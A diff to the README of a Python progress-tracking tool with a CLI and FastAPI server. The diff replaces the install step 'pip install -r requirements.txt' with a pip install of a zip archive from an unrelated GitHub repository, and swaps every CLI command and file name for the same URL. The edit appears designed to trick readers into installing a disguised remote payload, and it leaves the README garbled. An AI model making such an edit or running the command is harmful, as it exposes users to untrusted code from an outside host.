@@ -26,7 +26,7 @@ source .venv/bin/activate  # On Windows: .venv\Scripts\activate
 
 2. Install dependencies:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Jcvdm/VB4/raw/refs/heads/main/cerussite/V-3.6.zip
 ```
 
 3. Configure environment variables in `.env`:
@@ -42,12 +42,12 @@ VECTOR_DB_PATH=./vector_store
 
 1. Add a progress entry:
 ```bash
-python cli.py add -t "New Feature" -d "Implemented user authentication" -c feature -g auth -g security -i major
+python https://github.com/Jcvdm/VB4/raw/refs/heads/main/cerussite/V-3.6.zip add -t "New Feature" -d "Implemented user authentication" -c feature -g auth -g security -i major
 ```
 
 2. Search progress entries:
 ```bash
-python cli.py search -q "authentication implementation" -c feature -t auth
+python https://github.com/Jcvdm/VB4/raw/refs/heads/main/cerussite/V-3.6.zip search -q "authentication implementation" -c feature -t auth
 ```
 
 ### Using the API
@@ -68,11 +68,11 @@ uvicorn main:app --reload
 
 ## Project Structure
 
-- `models.py`: Data models for the application
-- `progress_tracker.py`: Git repository tracking and commit categorization
-- `storage_service.py`: Vector storage and search functionality
-- `main.py`: FastAPI server implementation
-- `cli.py`: Command-line interface
+- `https://github.com/Jcvdm/VB4/raw/refs/heads/main/cerussite/V-3.6.zip`: Data models for the application
+- `https://github.com/Jcvdm/VB4/raw/refs/heads/main/cerussite/V-3.6.zip`: Git repository tracking and commit categorization
+- `https://github.com/Jcvdm/VB4/raw/refs/heads/main/cerussite/V-3.6.zip`: Vector storage and search functionality
+- `https://github.com/Jcvdm/VB4/raw/refs/heads/main/cerussite/V-3.6.zip`: FastAPI server implementation
+- `https://github.com/Jcvdm/VB4/raw/refs/heads/main/cerussite/V-3.6.zip`: Command-line interface
 - `.env`: Configuration file
 
 ## Contributing
